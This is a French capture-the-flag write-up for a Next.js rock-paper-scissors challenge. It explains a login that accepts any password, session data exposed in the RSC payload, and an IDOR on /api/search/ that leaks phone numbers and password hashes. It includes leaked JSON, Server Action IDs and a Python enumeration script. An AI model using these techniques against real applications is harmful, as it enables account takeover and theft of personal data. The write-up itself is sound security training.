# Writeup — Arena of Fates (flag4jobs CTF)

## Approach

Le challenge est une application web Next.js de pierre-feuille-ciseaux avec un leaderboard. L'indice principal : *"something hidden in the data of the most skilled challengers"*. L'objectif est de récupérer le numéro de téléphone (contenant le flag) des joueurs #1 et #2 du leaderboard.

J'ai regardé en détails les sources à la recherche d'indices hardcodés sans succès, puis j'ai décidé de me concentrer sur l'onglet play du jeu. Mon intuition a porté sur la fonctionnalité de recherche d'un joueur afin de jouer avec lui. Étant donné que grâce au leaderboard on avait tous les pseudos, j'ai deviné le domaine mail du deuxième joueur **@gmail.com** et tenté un mot de passe au hasard respectant les critères de saisie — la connexion a fonctionné. Sur le compte, le numéro de téléphone n'est pas affiché. J'ai ensuite testé de me connecter avec d'autres users avec le domaine `@gmail.com` et ça marchait pour certains. Le but étant de se connecter avec le compte d'un autre joueur du leaderboard, inviter le deuxième joueur à jouer et chercher à leak ses infos.

## Solution

### Flag 1 — shelley.35+game (#2)

1. **Reconnaissance** — Analyse du HTML source et du payload RSC (`__next_f`). La session utilisateur est exposée en clair dans le payload, révélant email et score du joueur connecté. Le leaderboard montre que le #2 est `shelley.35+game` et le #1 est `glitch.mstr1`.

2. **Auth bypass** — En testant la connexion avec `shelley.35+game@gmail.com` et n'importe quel mot de passe, la connexion fonctionne. Le serveur ne valide pas le mot de passe correctement.

3. **Analyse des chunks JS** — Analyse du chunk `app/play/page-a6ded6c8c71947a5.js` dans les sources. Le module `5564` révèle un endpoint REST : `/api/search/:email`. Le module `1669` expose les Server Action IDs (hashes SHA1). On peut aussi facilement découvrir cet endpoint en capturant la requête émise par le navigateur dans l'onglet Network de DevTools après avoir invité un joueur.

4. **IDOR sur `/api/search/`** — L'endpoint retourne des données sensibles non filtrées : `phone`, `pwHash`, `email`. En appelant `/api/search/shelley.35%2Bgame@gmail.com` on obtient directement le flag #1 en examinant la réponse GET.
```json
[{
  "id": "3a205e9a-...",
  "name": "shelley.35+game",
  "email": "shelley.35+game@gmail.com",
  "pwHash": "l7qxjY...",
  "phone": "F4J{44e4e971af9d9c957708b650012a4593}",
  "score": 25
}]
```

### Flag 2 — glitch.mstr0 (#1)

1. **Trouver l'email de glitch** — Le CTF indique que le domaine est "presque impossible à deviner". L'intuition portait sur la fonctionnalité **Quick Play** qui matche aléatoirement des joueurs. En créant des parties et en vérifiant le `guestEmail` dans la réponse RSC, on finit par tomber sur `glitch.mstr0@pwns801you799.com`. Le domaine est aléatoire par instance de challenge.

2. **IDOR sur `/api/search/`** — En appelant `/api/search/glitch.mstr0@pwns801you799.com` on obtient le flag #2.
```
--- Tentative 1 ---
  Nouvelle partie: glitch.mstr0@pwns801you799.com (9d03d633...)
FOUND! glitch.mstr0@pwns801you799.com
Phone: F4J{0e0a86180c8d1f3d56fd948242b6e864}
```

## Key Insights

- Le payload RSC de Next.js (`__next_f`) expose la session complète en clair dans le HTML — toujours analyser ce payload en reconnaissance
- Les Server Actions Next.js sont identifiées par des hashes SHA1 visibles dans les chunks JS publics — les lire permet de reproduire n'importe quelle action serveur sans passer par l'UI :
```js
var s = (0, r.$)("3a846f28c517189f8c1cdd053073cfb5655b5766")  // Ss → jouer/forfeit
var n = (0, r.$)("9bf4f27fd98f538836ea136469ace3fc10b4737c")  // t  → créer partie
var i = (0, r.$)("2ba93e554113cdd4cfa2ae838a76283a7b03870e")  // cF → récupérer partie
```
- L'endpoint `/api/search/` était découvrable en lisant le JS minifié, ou en capturant la requête émise lors d'une recherche de joueur dans DevTools Network
- **IDOR classique** : le serveur retourne plus de champs que ce que le frontend affiche (`phone`, `pwHash`)
- Le `Content-Type: text/plain;charset=UTF-8` est obligatoire pour les Server Actions Next.js — avec `application/json` le serveur répond 200 mais ne reconnaît pas correctement la requête

## Tools

- Chrome DevTools (Network, Sources, Console)
- Python `requests`
- Navigateur (console JS)

## Code
```python
import requests
import json
import time
import re

BASE_URL = "http://worker01.flag4jobs.live:10753"
COOKIE = (
    "authjs.csrf-token=...;"
    "authjs.callback-url=...;"
    "authjs.session-token=..."
)

CREATE  = "9bf4f27fd98f538836ea136469ace3fc10b4737c"
PLAY    = "3a846f28c517189f8c1cdd053073cfb5655b5766"
GETGAME = "2ba93e554113cdd4cfa2ae838a76283a7b03870e"

ROUTER_STATE = (
    "%5B%22%22%2C%7B%22children%22%3A%5B%22play%22%2C%7B%22children%22%3A"
    "%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Fplay%22%2C%22refresh%22%5D%7D%5D"
    "%7D%2Cnull%2Cnull%2Ctrue%5D"
)

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Cookie": COOKIE,
    "Origin": BASE_URL,
    "Referer": BASE_URL + "/play",
    "Accept": "text/x-component",
    "Content-Type": "text/plain;charset=UTF-8",
    "Next-Router-State-Tree": ROUTER_STATE,
})

def action(action_id, body):
    r = session.post(BASE_URL + "/play", headers={
        "Next-Action": action_id,
    }, data=json.dumps(body), timeout=10)
    matches = re.findall(r'\n1:(.+)', r.text)
    for m in matches:
        try:
            return json.loads(m)
        except:
            continue
    return None

def get_active_games():
    r = session.get(BASE_URL + "/play", headers={
        "Accept": "*/*",
        "RSC": "1",
        "Next-Router-State-Tree": ROUTER_STATE,
    }, timeout=10)
    pairs = re.findall(
        r'"id":"([a-f0-9-]{36})","hostEmail":"[^"]+","guestEmail":"([^"]+)","winner":null',
        r.text
    )
    return pairs

def forfeit(game_id):
    action(PLAY, [{"gameId": game_id, "option": "forfeit"}])
    time.sleep(0.3)
    action(GETGAME, [game_id])

def get_phone(email):
    r = session.get(f"{BASE_URL}/api/search/{email}", timeout=10)
    data = r.json()
    return data[0].get("phone") if data else None

def hunt():
    attempt = 0
    while True:
        attempt += 1
        print(f"\n--- Tentative {attempt} ---")

        before = set(id for id, _ in get_active_games())
        r = action(CREATE, [None])

        if r and "too many games" in str(r):
            for game_id, _ in get_active_games():
                if game_id not in before:
                    forfeit(game_id)
            time.sleep(0.5)
            continue

        time.sleep(0.5)
        after = get_active_games()
        new_games = [(id, guest) for id, guest in after if id not in before]

        if not new_games:
            continue

        game_id, guest = new_games[0]
        print(f"  Nouvelle partie: {guest} ({game_id[:8]}...)")

        if "glitch" in guest:
            print(f"FOUND! {guest}")
            print(f"Phone: {get_phone(guest)}")
            break

        forfeit(game_id)
        time.sleep(0.4)

hunt()
```
